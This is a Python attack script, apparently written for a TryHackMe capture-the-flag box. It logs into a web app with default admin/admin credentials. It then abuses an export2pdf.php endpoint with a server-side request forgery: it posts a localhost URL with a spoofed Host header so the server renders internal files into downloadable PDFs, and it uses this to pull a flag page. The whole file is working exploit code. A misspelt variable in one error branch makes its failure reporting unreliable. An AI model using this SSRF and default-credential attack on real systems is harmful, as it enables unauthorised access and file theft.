#!/usr/bin/env python3

import argparse
import os
import platform
import re
import requests

class Interloper:
    def __init__(self, baseurl, targetip, targetfile=None):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"Baseurl must be a string. Got {type(baseurl)}")
        elif baseurl[-1] == "/":
            baseurl = baseurl[:-1]

        if not(isinstance(targetip,str)):
            raise TypeError(f"Targetip must be a string. Got {type(targetip)}")

        if targetfile is None:
            targetfile = "/etc/passwd"
        elif not(isinstance(targetfile,str)):
            raise TypeError(f"Targetfile must be a string. Got {type(baseurl)}")

        self.__baseurl = baseurl
        self.__targetfile = targetfile
        self.__targetip = targetip

        self.__session = requests.Session()
        return

    def GrabFile(self, filename=None, targetfile=None):
        data = dict()
        headers = dict()
        message = str()
        success = bool()
        targetroute = "export2pdf.php"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            if filename is None:
                filename="file.pdf"
            elif not(isinstance(filename,str)):
                raise TypeError(f"Filename must be a string. Got {type(filename)}")

            if targetfile is None:
                targetfile = self.__targetfile
            elif not(isinstance(targetfile,str)):
                raise TypeError(f"Targetfile must be a string. Got {type(targetfile)}")

            data["url"] = f"http://127.0.0.1/{targetfile}"

            headers["Host"] = self.__targetip

            resp = self.__session.post(targeturl, data=data, headers=headers, timeout=5)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            with open(filename,"wb") as fptr:
                fptr.write(resp.content)

            message = f"file successfully downloaded to \"{filename}\""
            success = True
        except Exception as ex:
            message = str(ex)
            succses = False

        return (success, message)

    def GrabFlag(self):
        data = str()
        message = str()
        pattern = "href=\".*(internal/.*\.php)\""
        success = bool()
        targetroute = "index.php"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            resp = self.__session.get(targeturl,timeout=5)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            data = resp.text

            targetfile, success, message = FindFlag(data, pattern)
            if not(success):
                raise ValueError(message)

            success, message = self.GrabFile(targetfile=targetfile, filename="flag.pdf")
            if not(success):
                raise ValueError(message)

            message = "flag successfully downloaded to \"flag.pdf\""
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def Login(self):
        data = dict()
        failroute = f"{self.__baseurl}/login.php"
        headers = dict()
        message = str()
        success = bool()
        targetroute = "verify.php"
        targeturl = f"{self.__baseurl}/{targetroute}"
        uname = password = "admin"

        try:
            data["password"] = password
            data["username"] = uname

            headers["Host"] = self.__targetip

            resp = self.__session.get(failroute)
            if resp.status_code >= 400:
                raise ValueError(f"unable to reach \"{failroute}\"")

            resp = self.__session.post(targeturl, data=data, timeout=5)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            nextloc = resp.url
            if nextloc == failroute:
                raise ValueError(f"login failed. incorrect credentials.")

            message = "login success"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("-f","--file", help="file to download", dest="tfile", type=str, default="server-info.php")
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure
    tfile = args.tfile

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    InfoMsg(f"Target File: {tfile}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}"

    attacker = Interloper(baseurl, target, targetfile=tfile)
    success, message = attacker.Login()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    success, message = attacker.GrabFile()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    success, message = attacker.GrabFlag()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    return

if __name__ == "__main__":
    main()

